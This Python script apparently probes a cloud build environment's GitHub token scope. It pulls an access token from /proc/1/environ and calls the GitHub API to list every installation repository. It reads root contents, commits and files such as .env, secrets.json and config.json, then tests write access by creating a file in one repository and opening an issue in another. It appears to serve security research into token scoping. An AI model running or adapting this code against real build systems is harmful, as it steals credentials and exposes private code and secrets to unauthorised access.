import json, os, urllib.request, urllib.error, ssl, re, glob

r = {}
ctx = ssl.create_default_context()

# 1. Find token from /proc/1/environ
token = None
try:
    environ = open('/proc/1/environ').read()
    match = re.search(r'x-access-token:([^@\x00]+)@', environ)
    if match:
        token = match.group(1)
except:
    pass

if not token:
    r['error'] = 'No token'
    print(json.dumps(r, indent=2))
    exit()

r['token_prefix'] = token[:12] + '...'

headers = {
    'Authorization': f'token {token}',
    'Accept': 'application/vnd.github+json',
    'User-Agent': 'probe/1.0'
}

def gh(path):
    try:
        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        return {'s': resp.status, 'd': json.loads(resp.read().decode())}
    except urllib.error.HTTPError as e:
        return {'s': e.code, 'e': e.read().decode(errors='replace')[:300]}
    except Exception as e:
        return {'err': str(e)[:100]}

# 2. List ALL installation repos
ir = gh('/installation/repositories?per_page=100')
repos = ir.get('d', {}).get('repositories', [])
r['total_repos'] = len(repos)

# 3. For EACH repo: try to read contents (root dir) and check private status
r['repo_access'] = {}
for repo in repos:
    full_name = repo.get('full_name', '?')
    is_private = repo.get('private', False)

    entry = {
        'private': is_private,
        'permissions': repo.get('permissions', {}),
    }

    # Try to read root contents
    contents = gh(f'/repos/{full_name}/contents/')
    if contents.get('s') == 200:
        files = contents.get('d', [])
        entry['can_read_contents'] = True
        entry['files'] = [f.get('name', '?') for f in files if isinstance(f, dict)][:20]
        entry['file_count'] = len(files)

        # Try to read a specific file (README or any file)
        for f in files:
            if isinstance(f, dict):
                fname = f.get('name', '')
                if fname.lower() in ['readme.md', '.env', '.env.example', 'config.json', 'secrets.json', '.gitignore']:
                    file_result = gh(f'/repos/{full_name}/contents/{fname}')
                    if file_result.get('s') == 200:
                        fd = file_result.get('d', {})
                        if isinstance(fd, dict) and fd.get('encoding') == 'base64':
                            import base64
                            content = base64.b64decode(fd.get('content', '')).decode(errors='replace')
                            entry[f'file_{fname}'] = content[:500]
    else:
        entry['can_read_contents'] = False
        entry['contents_error'] = contents.get('e', str(contents.get('s', '?')))[:100]

    # Try to read commits
    commits = gh(f'/repos/{full_name}/commits?per_page=1')
    if commits.get('s') == 200:
        entry['can_read_commits'] = True
        cd = commits.get('d', [])
        if cd and isinstance(cd, list):
            entry['last_commit'] = cd[0].get('commit', {}).get('message', '?')[:100]
    else:
        entry['can_read_commits'] = False

    r['repo_access'][full_name] = entry

# 4. Try to WRITE to a repo (create an issue as proof, then delete it)
r['write_tests'] = {}

# Try creating a file in the build repo
import base64
try:
    data = json.dumps({
        'message': 'test write access',
        'content': base64.b64encode(b'test').decode()
    }).encode()
    req = urllib.request.Request(
        f'https://api.github.com/repos/rollingWaves/build-imds-test/contents/_write_test.txt',
        data=data,
        headers={**headers, 'Content-Type': 'application/json'},
        method='PUT'
    )
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    r['write_tests']['create_file'] = {'s': resp.status}
    resp.read()
    # Clean up - delete it
    try:
        # Get SHA first
        get_resp = gh('/repos/rollingWaves/build-imds-test/contents/_write_test.txt')
        sha = get_resp.get('d', {}).get('sha', '')
        if sha:
            del_data = json.dumps({'message': 'cleanup', 'sha': sha}).encode()
            del_req = urllib.request.Request(
                f'https://api.github.com/repos/rollingWaves/build-imds-test/contents/_write_test.txt',
                data=del_data,
                headers={**headers, 'Content-Type': 'application/json'},
                method='DELETE'
            )
            urllib.request.urlopen(del_req, timeout=10, context=ctx).read()
            r['write_tests']['delete_file'] = 'cleaned up'
    except:
        pass
except urllib.error.HTTPError as e:
    r['write_tests']['create_file'] = {'s': e.code, 'e': e.read().decode()[:200]}
except Exception as e:
    r['write_tests']['create_file'] = {'err': str(e)[:100]}

# 5. Try to create an issue in ANOTHER repo
try:
    data = json.dumps({
        'title': 'DO App Platform build token scope test',
        'body': 'This issue was created from a DO App Platform build to test token scope. Safe to delete.'
    }).encode()
    req = urllib.request.Request(
        f'https://api.github.com/repos/rollingWaves/build-bp-test/issues',
        data=data,
        headers={**headers, 'Content-Type': 'application/json'},
        method='POST'
    )
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    issue = json.loads(resp.read().decode())
    r['write_tests']['create_issue_other_repo'] = {
        's': resp.status,
        'issue_number': issue.get('number', '?'),
        'url': issue.get('html_url', '?')
    }
except urllib.error.HTTPError as e:
    r['write_tests']['create_issue_other_repo'] = {'s': e.code, 'e': e.read().decode()[:200]}
except Exception as e:
    r['write_tests']['create_issue_other_repo'] = {'err': str(e)[:100]}

print(json.dumps(r, indent=2, default=str))
